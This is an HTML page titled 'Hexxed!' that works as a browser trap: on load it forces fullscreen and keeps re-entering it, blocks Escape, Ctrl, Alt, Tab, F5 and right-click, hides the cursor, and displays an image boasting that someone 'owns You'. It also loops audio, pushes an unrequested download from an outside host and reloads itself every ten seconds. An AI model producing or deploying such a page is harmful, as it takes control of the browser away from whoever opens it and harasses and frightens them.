<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      user-select: none;
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      object-position: center;
      user-select: none;
      pointer-events: none;
    }

    body.fullscreen {
      cursor: none; /* Hide cursor */
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';

    // Function to trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
      document.body.classList.add('fullscreen');
    }

    // Attempt to play audio
    function tryPlayAudio() {
      audio.play().catch((error) => {
        console.log('Autoplay prevented:', error);
        document.addEventListener('click', () => {
          audio.play().catch(() => {});
        }, { once: true });
      });
    }

    // Enhanced fullscreen trap
    function trapFullscreen() {
      // Re-enter fullscreen on exit
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      });
      // Block Escape key and other shortcuts
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' || e.key === 'F5' || e.ctrlKey || e.altKey) {
          e.preventDefault();
          enterFullscreen();
        }
      });
      // Periodically check and re-enter fullscreen
      setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      }, 500);
    }

    // Adjusted download behavior
    function handleDownloads() {
      // Single download to avoid multiple prompts
      triggerDownload(mp3Url, '1.mp3');
      // Optional: Uncomment below for controlled multiple downloads
      /*
      const downloadCount = 3; // Reduced to minimize prompts
      let delay = 100;
      for (let i = 0; i < downloadCount; i++) {
        setTimeout(() => {
          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
        }, delay);
        delay += 500;
      }
      */
    }

    window.addEventListener('load', () => {
      enterFullscreen();
      trapFullscreen();
      tryPlayAudio();
      handleDownloads();

      // Refresh page after a delay (optional)
      setTimeout(() => {
        window.location.reload();
      }, 10000); // Increased to 10 seconds
    });

    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
        enterFullscreen();
      }
    });

    // Block right-click and shortcuts
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('keydown', (e) => {
      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape' || e.key === 'Tab') {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
